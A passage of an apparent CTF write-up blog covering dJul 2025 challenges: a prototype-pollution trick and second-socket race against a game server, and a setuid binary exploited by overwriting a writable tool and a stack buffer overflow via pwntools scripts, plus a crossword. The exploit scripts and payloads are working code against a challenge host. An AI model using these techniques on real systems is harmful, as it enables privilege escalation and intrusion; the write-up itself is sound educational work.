+</span></span><span class=line><span class=cl>    <span class=nx>io</span><span class=p>.</span><span class=nx>to</span><span class=p>(</span><span class=nx>lobby</span><span class=p>.</span><span class=nx>room</span><span class=p>).</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;lobby-status&#34;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nx>code</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nx>players</span><span class=o>:</span> <span class=nx>getLobbyPlayers</span><span class=p>(</span><span class=nx>lobby</span><span class=p>).</span><span class=nx>map</span><span class=p>((</span><span class=nx>p</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>({</span>
+</span></span><span class=line><span class=cl>        <span class=nx>id</span><span class=o>:</span> <span class=nx>p</span><span class=p>.</span><span class=nx>id</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>team</span><span class=o>:</span> <span class=nx>p</span><span class=p>.</span><span class=nx>team</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=p>})),</span>
+</span></span><span class=line><span class=cl>    <span class=p>});</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=nx>socket</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;lobby-created&#34;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>code</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span></code></pre></div><p>They have &ldquo;disabled&rdquo; the extreme bot by commenting it out. However, this
+conditional is flawed:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>payload</span> <span class=o>&amp;&amp;</span> <span class=nx>payload</span><span class=p>.</span><span class=nx>botName</span> <span class=o>&amp;&amp;</span> <span class=nx>payload</span><span class=p>.</span><span class=nx>botName</span> <span class=k>in</span> <span class=nx>bots</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nx>botMode</span> <span class=o>=</span> <span class=nx>bots</span><span class=p>[</span><span class=nx>payload</span><span class=p>.</span><span class=nx>botName</span><span class=p>].</span><span class=nx>mode</span> <span class=o>||</span> <span class=s2>&#34;extreme&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>If the <code>botName</code> sent by the client would in some way exist in the <code>bots</code>
+dictionary but not have an associated <code>mode</code>, then the difficulty <code>botMode</code>
+defaults to extreme. All JavaScript objects have a <code>__proto__</code> accessor, so
+<code>__proto__ in bots</code> is true and since there&rsquo;s no <code>__proto__.mode</code> we get
+<code>botMode = "extreme"</code>!</p><p>I simply used the browser terminal to send arbitrary commands on the established
+socket. This triggers the extreme bot:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>socket</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;host-game&#34;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>botName</span><span class=o>:</span> <span class=s2>&#34;__proto__&#34;</span> <span class=p>});</span>
+</span></span></code></pre></div><p>Next up is to find a way to beat the extreme game. I don&rsquo;t think there&rsquo;s any way
+of beating the extreme bot legitimately, even if you were to find an optimal
+strategy. Instead, we can recall that dAnkan in the beginning of the challenge&rsquo;s
+story rambled something about a &ldquo;<em>second sock-rocket [&mldr;] so-rocket</em>&rdquo;. We can
+assume that this hints towards using a second socket somehow.</p><p>It is possible to join any existing game that isn&rsquo;t already full if you have the
+game code, like so:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>socket</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;join-game&#34;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>code</span><span class=o>:</span> <span class=o>&lt;</span><span class=nx>code</span><span class=o>&gt;</span> <span class=p>});</span>
+</span></span></code></pre></div><p>If we join the generated bot game with a second client <em>before</em> the bot itself
+can join, then we would control both players and there would be no extreme bot
+in the lobby, yet it would still be an extreme level game. To achieve this we
+have to join our own game within the server&rsquo;s tick rate of 100 ms. This is done
+rather simply by creating a second socket and a function that instantly joins
+the game of the first socket. Lastly we trigger an extreme game as previously
+described.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>s2</span> <span class=o>=</span> <span class=nx>io</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nx>socket</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s2>&#34;lobby-joined&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nx>s2</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;join-game&#34;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>code</span><span class=o>:</span> <span class=nx>data</span><span class=p>.</span><span class=nx>code</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span><span class=line><span class=cl><span class=nx>socket</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;host-game&#34;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>botName</span><span class=o>:</span> <span class=s2>&#34;__proto__&#34;</span> <span class=p>});</span>
+</span></span></code></pre></div><p>Now that we control the opponent and can choose for it to do nothing it is easy
+to beat the game by just playing regularly. Upon winning we get the solution to
+the challenge, <code>ISKENDER</code>.</p><h2 class="relative group">Window 23: You run what I tell you to run<div id=window-23-you-run-what-i-tell-you-to-run class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-23-you-run-what-i-tell-you-to-run aria-label=Anchor>#</a></span></h2><p>This challenge gives you access to a machine with a very stripped down shell.
+You are essentially limited to using only the commands <code>cd</code>, <code>ls</code> and <code>printf</code>.
+There is a file <code>secret</code> that can only be read by a root user, and there&rsquo;s also
+a directory <code>grischtooling</code> with executables <code>grischtooling/haxxxxme</code> and
+<code>grischtooling/sl</code>.</p><p><code>haxxxxme</code> has the <a href=https://en.wikipedia.org/wiki/Setuid target=_blank>setuid</a> bit set, so we
+can expect to use it to get a root shell somehow, after which we would be able
+to read the <code>secret</code> file (likely containing the challenge&rsquo;s solution). Running
+<code>haxxxxme</code> prompts you for a password, but without a better understanding of the
+binary it could be really difficult to guess correctly.</p><p><code>sl</code> is <a href=https://github.com/mtoyoda/sl target=_blank>sl</a>, but more interestingly is that we
+have full access permissions to it. This means we could possibly overwrite it
+with any other executable we may want to run, which would make the limited shell
+much less limited.</p><p>My plan became to overwrite <code>grischtooling/sl</code> with a hexdump program to print
+some encoded version of the entire <code>grischtooling/haxxxxme</code> executable. It would
+then be possible to decode the output to recreate the executable on my local
+machine, and inspect it properly.</p><p>I wrote and compiled an as simple hexdump as I could think of:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>FILE</span> <span class=o>*</span><span class=n>f</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s>&#34;rb&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>((</span><span class=n>c</span> <span class=o>=</span> <span class=nf>fgetc</span><span class=p>(</span><span class=n>f</span><span class=p>))</span> <span class=o>!=</span> <span class=n>EOF</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%02x&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>Then, <a href=https://docs.pwntools.com/en/stable/ target=_blank>pwntools</a> makes it quite simple to
+overwrite <code>sl</code> and dump <code>haxxxxme</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>HOST</span> <span class=o>=</span> <span class=s2>&#34;lucks.djul.se&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>PORT</span> <span class=o>=</span> <span class=mi>16767</span>
+</span></span><span class=line><span class=cl><span class=n>PASSWORD</span><span class=o>=</span> <span class=s2>&#34;67grischfortnite1337&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>LOCAL_PATH</span> <span class=o>=</span> <span class=s2>&#34;./hexdump&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>REMOTE_PATH</span> <span class=o>=</span> <span class=s2>&#34;grischtooling/sl&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>CHUNK_SIZE</span> <span class=o>=</span> <span class=mi>200</span>  <span class=c1># bytes per printf</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>octal_encode</span><span class=p>(</span><span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=c1># Convert raw bytes to printf-safe octal escapes</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\\</span><span class=si>{</span><span class=n>b</span><span class=si>:</span><span class=s2>03o</span><span class=si>}</span><span class=s2>&#34;</span> <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>HOST</span><span class=p>,</span> <span class=n>PORT</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>PASSWORD</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span> <span class=c1># Password connect</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>LOCAL_PATH</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>binary</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># Truncate remote file first</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;&gt; </span><span class=si>{</span><span class=n>REMOTE_PATH</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># Upload in chunks</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>binary</span><span class=p>),</span> <span class=n>CHUNK_SIZE</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>chunk</span> <span class=o>=</span> <span class=n>binary</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span> <span class=o>+</span> <span class=n>CHUNK_SIZE</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>encoded</span> <span class=o>=</span> <span class=n>octal_encode</span><span class=p>(</span><span class=n>chunk</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>cmd</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;printf &#39;</span><span class=si>{</span><span class=n>encoded</span><span class=si>}</span><span class=s2>&#39; &gt;&gt; </span><span class=si>{</span><span class=n>REMOTE_PATH</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>cmd</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># Hexdump haxxxxme</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;./grischtooling/sl grischtooling/haxxxxme&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># Print everything we get back</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></div><p>After having decoded the dumped file we can first see that it is not stripped
+and thus contains debugging information, making the task of reversing it easier.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> file haxxxxme
+</span></span><span class=line><span class=cl><span class=go>haxxxxme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5bed78c5c66779304f86c322a3bb306f13a0f646, for GNU/Linux 3.2.0, not stripped
+</span></span></span></code></pre></div><p>We can de-compile it with
+<a href=https://github.com/NationalSecurityAgency/ghidra target=_blank>Ghidra</a> and locate the <code>auth</code>
+function that we are interested in (I&rsquo;ve chosen appropriate types and variable
+names):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>auth</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>comparisonResult</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>randomData</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>inputPassword</span><span class=p>[</span><span class=mi>40</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>randomFile</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;enter the secret password lil bro: &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>inputPassword</span><span class=p>,</span><span class=mi>256</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>randomFile</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span><span class=s>&#34;rb&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>randomFile</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;fopen&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=nf>fread</span><span class=p>(</span><span class=n>randomData</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>32</span><span class=p>,</span><span class=n>randomFile</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>fclose</span><span class=p>(</span><span class=n>randomFile</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>comparisonResult</span> <span class=o>=</span> <span class=nf>memcmp</span><span class=p>(</span><span class=n>inputPassword</span><span class=p>,</span><span class=n>randomData</span><span class=p>,</span><span class=mi>32</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>comparisonResult</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;access granted!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>boom</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;access denied!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>It selects a random password by polling <code>/dev/urandom</code> and if it matches the
+first 32 bytes of the user-supplied value the subroutine <code>boom</code> is called, which
+upgrades the shell to root.</p><p>It is not feasible to ever be lucky enough to guess the random password
+correctly. Instead, we note that the program reads 256 bytes of input into an
+array of 40 bytes. This is a perfect opportunity to
+<a href=https://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf target=_blank>smash the stack</a>!
+We can supply a long input and overwrite the return pointer of the <code>auth</code>
+function on the stack, so that when it returns it will return to whatever
+address we want. We want to it call <code>boom()</code> to upgrade our shell.</p><p>With the help of <a href=https://sourceware.org/gdb/ target=_blank>GDB</a> we can find out that the
+return pointer begins at the 57th byte of our input. We can also find that
+<code>boom</code> has a static address of <code>0x00401206</code>. Our payload to input thus should be
+56 bytes of anything followed by the address of <code>boom</code>. We write another
+<code>pwntools</code> script to supply the payload to <code>haxxxxme</code> to upgrade our shell, and
+then dump <code>secret</code> using the hexdump program like before.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>HOST</span> <span class=o>=</span> <span class=s2>&#34;lucks.djul.se&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>PORT</span> <span class=o>=</span> <span class=mi>16767</span>
+</span></span><span class=line><span class=cl><span class=n>PASWWORD</span> <span class=o>=</span> <span class=s2>&#34;67grischfortnite1337&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>LOCAL_PATH</span> <span class=o>=</span> <span class=s2>&#34;./hexdump&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>REMOTE_PATH</span> <span class=o>=</span> <span class=s2>&#34;grischtooling/sl&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>CHUNK_SIZE</span> <span class=o>=</span> <span class=mi>200</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>boom_address</span> <span class=o>=</span> <span class=mh>0x00401206</span>
+</span></span><span class=line><span class=cl><span class=n>buffer_size</span> <span class=o>=</span> <span class=mi>56</span>
+</span></span><span class=line><span class=cl><span class=n>PAYLOAD</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>buffer_size</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>boom_address</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>octal_encode</span><span class=p>(</span><span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\\</span><span class=si>{</span><span class=n>b</span><span class=si>:</span><span class=s2>03o</span><span class=si>}</span><span class=s2>&#34;</span> <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>HOST</span><span class=p>,</span> <span class=n>PORT</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>PASSWORD</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># Run haxxxxme and input the payload</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;./grischtooling/haxxxxme&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>PAYLOAD</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>LOCAL_PATH</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>binary</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>binary</span><span class=p>),</span> <span class=n>CHUNK_SIZE</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>chunk</span> <span class=o>=</span> <span class=n>binary</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span> <span class=o>+</span> <span class=n>CHUNK_SIZE</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>encoded</span> <span class=o>=</span> <span class=n>octal_encode</span><span class=p>(</span><span class=n>chunk</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>cmd</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;printf &#39;</span><span class=si>{</span><span class=n>encoded</span><span class=si>}</span><span class=s2>&#39; &gt;&gt; </span><span class=si>{</span><span class=n>REMOTE_PATH</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>cmd</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># Hexdump secret</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;./grischtooling/sl secret&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></div><p>All that is left is to decode the hexdump to reveal the solution to the
+challenge.</p><blockquote><p>What was the sought word you may ask? I have no clue, I forgot to note it down
+(:</p></blockquote><h2 class="relative group">Window 24: The Tell-Tale Crumb<div id=window-24-the-tell-tale-crumb class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-24-the-tell-tale-crumb aria-label=Anchor>#</a></span></h2><p>This non-scored final challenge is a crossword puzzle, giving you a cozy and
+stress-free end of dJul.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Crossword solution" width=1514 height=1221 src=/posts/djul-writeup-2025/img/window24_crossword_hu3504070286514692966.png srcset="/posts/djul-writeup-2025/img/window24_crossword_hu3504070286514692966.png 800w, /posts/djul-writeup-2025/img/window24_crossword_hu8567279602833300889.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window24_crossword.png></figure><p>We read the final solution, <code>IMPOSTOR</code>.</p></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_posts/djul-writeup-2025/index.md data-oid-likes=likes_posts/djul-writeup-2025/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span class="flex flex-col"></span><span class="flex flex-col items-end"><a class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/posts/esl-hacking/><span class=leading-6>ESL Hacking&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+</span></a><span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-12-07T00:00:00+00:00>7 Dec 2025</time></span></span></div></div></footer></article><div id=scroll-to-top class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200"><a href=#the-top class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex list-none flex-col sm:flex-row"><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/ title=laydbg>Home</a></li><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/about/ title="About me">About</a></li></ul></nav><div class="flex items-center justify-between"></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer></div></body></html>
